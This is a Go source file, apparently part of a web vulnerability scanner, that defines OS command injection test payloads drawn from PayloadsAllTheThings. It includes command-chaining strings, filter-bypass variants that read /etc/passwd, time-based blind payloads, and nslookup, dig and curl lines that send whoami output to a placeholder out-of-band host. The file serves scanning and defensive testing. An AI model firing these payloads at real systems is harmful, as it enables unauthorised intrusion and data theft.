package payloads

// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
// Command Injection â€” Sourced from PayloadsAllTheThings/Command Injection
// Covers: Chaining, Argument Injection, Filter Bypasses (space, line return,
//         backslash, tilde, brace, hex, quote, wildcard, variable expansion),
//         DNS/Time Exfiltration, Polyglot
// â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

func CommandInjectionPayloads() PayloadSet {
	return PayloadSet{
		Category:    CatCMDi,
		Description: "OS Command Injection â€” PayloadsAllTheThings + CWE-78",
		Version:     "2.0.0",
		Source:      "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection",
		Payloads:    cmdiAll(),
	}
}

func cmdiAll() []Payload {
	var all []Payload
	all = append(all, cmdiChaining()...)
	all = append(all, cmdiFilterBypass()...)
	all = append(all, cmdiTimeExfil()...)
	all = append(all, cmdiDNSExfil()...)
	all = append(all, cmdiPolyglot()...)
	all = append(all, cmdiWindows()...)
	return all
}

// â”€â”€â”€â”€ Chaining Commands (PayloadsAllTheThings: ;, &&, ||, &, |) â”€â”€â”€â”€
func cmdiChaining() []Payload {
	cmds := []struct{ id, name, value, desc string }{
		{"cmdi-semicolon-id", "Semicolon + id", `; id`, "Semicolon separator â€” executes id after prior command"},
		{"cmdi-pipe-id", "Pipe + id", `| id`, "Pipe operator â€” pipes output into id"},
		{"cmdi-and-id", "AND + id", `&& id`, "AND chain â€” executes id only if prior succeeds"},
		{"cmdi-or-id", "OR + id", `|| id`, "OR chain â€” executes id only if prior fails"},
		{"cmdi-bg-id", "Background + id", `& id`, "Background prior command then execute id"},
		{"cmdi-backtick-id", "Backtick id", "`id`", "Backtick command substitution"},
		{"cmdi-dollar-id", "$() id", `$(id)`, "Dollar-paren command substitution â€” modern bash"},
		{"cmdi-newline-id", "Newline + id", "%0aid", "URL-encoded newline to inject new command"},
		{"cmdi-cr-id", "CR + id", "%0did", "Carriage return injection"},
		{"cmdi-crlf-id", "CRLF + id", "%0d%0aid", "Full CRLF injection"},
	}
	var payloads []Payload
	for _, c := range cmds {
		payloads = append(payloads,
			cp(c.id, TechClassic, c.name, c.value, c.desc, active, DetectReflection,
				`uid=[0-9]+\(`, []string{"Linux", "Unix", "macOS"}, nil))
	}
	return payloads
}

// â”€â”€â”€â”€ Filter Bypasses (PayloadsAllTheThings Filter Bypasses section) â”€â”€â”€â”€
func cmdiFilterBypass() []Payload {
	return []Payload{
		// Without space
		cp("cmdi-bypass-ifs", TechFilterBypass, "IFS Space Bypass", ";{cat,/etc/passwd}",
			"$IFS field separator instead of space â€” PayloadsAllTheThings",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"no_space"}),
		cp("cmdi-bypass-ifs-var", TechFilterBypass, "IFS Variable", `;cat$IFS/etc/passwd`,
			"$IFS variable substitution for space",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"no_space"}),
		cp("cmdi-bypass-tab", TechFilterBypass, "Tab Instead of Space", ";\tcat\t/etc/passwd",
			"Tab character instead of space",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"no_space"}),
		cp("cmdi-bypass-brace-expansion", TechFilterBypass, "Brace Expansion", `;{cat,/etc/passwd}`,
			"Bash brace expansion â€” PayloadsAllTheThings",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"no_space"}),

		// Line return / backslash newline
		cp("cmdi-bypass-line-return", TechFilterBypass, "Line Return Bypass", ";\nid",
			"Line return to bypass single-line command filters",
			active, DetectReflection, `uid=`, []string{"Linux"}, []string{"line_return"}),
		cp("cmdi-bypass-backslash-newline", TechFilterBypass, "Backslash Newline", "i\\\nd",
			"Backslash-newline line continuation splits keyword â€” PayloadsAllTheThings",
			active, DetectReflection, `uid=`, []string{"Linux"}, []string{"backslash"}),

		// Character filter via hex encoding
		cp("cmdi-bypass-hex-cat", TechFilterBypass, "Hex Encoded cat", `;$(printf '\x63\x61\x74') /etc/passwd`,
			"printf hex encoding to bypass command keyword filters",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"hex_encoding"}),
		cp("cmdi-bypass-xxd", TechFilterBypass, "XXD Hex Decode", `;echo 636174202f6574632f706173737764|xxd -r -p|bash`,
			"Hex-encoded command piped through xxd â€” full keyword bypass",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"hex_encoding"}),

		// Quote splitting
		cp("cmdi-bypass-single-quote", TechFilterBypass, "Single Quote Split", `w'h'o'a'm'i`,
			"Single-quote splitting â€” PayloadsAllTheThings",
			active, DetectReflection, `(?i)(uid=|[a-z]+\\[a-z]+)`, []string{"Linux"}, []string{"quote_split"}),
		cp("cmdi-bypass-double-quote", TechFilterBypass, "Double Quote Split", `w"h"o"a"m"i`,
			"Double-quote splitting",
			active, DetectReflection, `(?i)(uid=|[a-z]+\\[a-z]+)`, []string{"Linux"}, []string{"quote_split"}),

		// Backslash and slash splitting
		cp("cmdi-bypass-backslash-split", TechFilterBypass, "Backslash Split", `w\ho\am\i`,
			"Backslash character insertion â€” PayloadsAllTheThings",
			active, DetectReflection, `(?i)(uid=|[a-z]+\\[a-z]+)`, []string{"Linux"}, []string{"backslash_split"}),

		// $@ bypass
		cp("cmdi-bypass-dollar-at", TechFilterBypass, "$@ Variable Bypass", `wh$@oami`,
			"$@ empty variable bypass â€” PayloadsAllTheThings",
			active, DetectReflection, `(?i)(uid=|[a-z]+\\[a-z]+)`, []string{"Linux"}, []string{"variable_bypass"}),

		// Variable expansion
		cp("cmdi-bypass-var-expansion", TechFilterBypass, "Variable Expansion", `${PATH%%u*}`,
			"Bash variable expansion â€” extracts / from PATH",
			active, DetectReflection, `/`, []string{"Linux"}, []string{"variable_expansion"}),

		// Wildcards (PayloadsAllTheThings)
		cp("cmdi-bypass-wildcard-cat", TechFilterBypass, "Wildcard /bin/cat", `/???/??t /???/??????`,
			"Glob wildcard bypass: /bin/cat /etc/passwd â€” no keywords",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"wildcard"}),
		cp("cmdi-bypass-wildcard-star", TechFilterBypass, "Wildcard /bin/*", `/bin/c?t /et?/pas?wd`,
			"Single-char wildcard bypass â€” partial keyword masking",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"wildcard"}),

		// Tilde expansion
		cp("cmdi-bypass-tilde", TechFilterBypass, "Tilde Home Expansion", `;cat ~/../../etc/passwd`,
			"Tilde expansion through home directory â€” PayloadsAllTheThings",
			active, DetectReflection, `root:`, []string{"Linux"}, []string{"tilde"}),

		// Random case
		cp("cmdi-bypass-random-case", TechFilterBypass, "Random Case PowerShell", `WhoAmI`,
			"Windows PowerShell is case-insensitive â€” bypasses exact-match filters",
			active, DetectReflection, `(?i)[a-z]+\\[a-z]+`, []string{"Windows"}, []string{"case_bypass"}),
	}
}

// â”€â”€â”€â”€ Time-Based Exfiltration (PayloadsAllTheThings Data Exfiltration) â”€â”€â”€â”€
func cmdiTimeExfil() []Payload {
	return []Payload{
		cp("cmdi-time-sleep-unix", TechTimeBlind, "Blind sleep(5) Unix", `; sleep 5`,
			"Time-based blind â€” Unix sleep command",
			active, DetectTimeDelta, ``, []string{"Linux", "Unix"}, []string{"time_blind"}),
		cp("cmdi-time-sleep-subshell", TechTimeBlind, "Blind $(sleep 5)", `$(sleep 5)`,
			"Subshell sleep â€” inline context blind detection",
			active, DetectTimeDelta, ``, []string{"Linux", "Unix"}, []string{"time_blind"}),
		cp("cmdi-time-ping-windows", TechTimeBlind, "Blind ping Windows", `& ping -n 5 127.0.0.1`,
			"Windows ping delay â€” 5 ICMP packets ~5s",
			active, DetectTimeDelta, ``, []string{"Windows"}, []string{"time_blind"}),
	}
}

// â”€â”€â”€â”€ DNS-Based Exfiltration (PayloadsAllTheThings) â”€â”€â”€â”€
func cmdiDNSExfil() []Payload {
	return []Payload{
		cp("cmdi-dns-nslookup", TechOOBExfil, "DNS nslookup Exfil",
			"; nslookup `whoami`.VYOMITE_OOB_HOST",
			"DNS exfiltration via nslookup â€” PayloadsAllTheThings",
			active, DetectOOBCallback, ``, []string{"Linux"}, []string{"dns_exfil"}),
		cp("cmdi-dns-dig", TechOOBExfil, "DNS dig Exfil",
			"; dig `whoami`.VYOMITE_OOB_HOST",
			"DNS exfiltration via dig command",
			active, DetectOOBCallback, ``, []string{"Linux"}, []string{"dns_exfil"}),
		cp("cmdi-dns-curl", TechOOBExfil, "HTTP curl Exfil",
			"; curl http://VYOMITE_OOB_HOST/$(whoami)",
			"HTTP exfiltration via curl â€” OOB callback",
			active, DetectOOBCallback, ``, []string{"Linux"}, []string{"http_exfil"}),
	}
}

// â”€â”€â”€â”€ Polyglot (PayloadsAllTheThings) â”€â”€â”€â”€
func cmdiPolyglot() []Payload {
	return []Payload{
		cp("cmdi-polyglot-all", TechPolyglot, "Universal Polyglot",
			"`sleep 5``id|sleep 5|id$(sleep 5)$(id)$({sleep,5})$({id})",
			"Multi-separator polyglot â€” covers backtick, pipe, dollar-paren, brace",
			active, DetectTimeDelta, ``, []string{"Linux"}, []string{"polyglot"}),
	}
}

// â”€â”€â”€â”€ Windows-Specific â”€â”€â”€â”€
func cmdiWindows() []Payload {
	return []Payload{
		cp("cmdi-win-pipe-whoami", TechClassic, "Windows Pipe whoami", `| whoami`,
			"Windows pipe chain with whoami",
			active, DetectReflection, `(?i)[a-z]+\\[a-z]+`, []string{"Windows"}, nil),
		cp("cmdi-win-and-whoami", TechClassic, "Windows AND whoami", `& whoami`,
			"Windows ampersand chain with whoami",
			active, DetectReflection, `(?i)[a-z]+\\[a-z]+`, []string{"Windows"}, nil),
		cp("cmdi-win-dir", TechClassic, "Windows dir", `& dir`,
			"Windows dir command to verify command injection",
			active, DetectReflection, `(?i)(Volume|Directory of)`, []string{"Windows"}, nil),
		cp("cmdi-win-powershell", TechClassic, "PowerShell Invoke", `| powershell -c "whoami"`,
			"PowerShell execution via pipe",
			active, DetectReflection, `(?i)[a-z]+\\[a-z]+`, []string{"Windows"}, nil),
	}
}

func cp(id string, tech Technique, name, value, desc string, safeMode bool,
	detection DetectionMethod, signature string, stack, tags []string) Payload {
	delayMs := 0
	if detection == DetectTimeDelta {
		delayMs = 5000
	}
	return Payload{
		ID: id, Category: CatCMDi, Technique: tech, Name: name, Value: value,
		Description: desc,
		Contexts:    []InjectionContext{CtxURLQuery, CtxFormBody},
		Detection:   detection, DetectSignature: signature,
		DelayMs: delayMs,
		Severity: SevCritical, SafeMode: safeMode, CVSSScore: 9.8,
		TargetStack: stack, CWE: "CWE-78", OWASPCategory: "A03:2021",
		Reference: "PayloadsAllTheThings", Tags: tags, Enabled: true,
	}
}
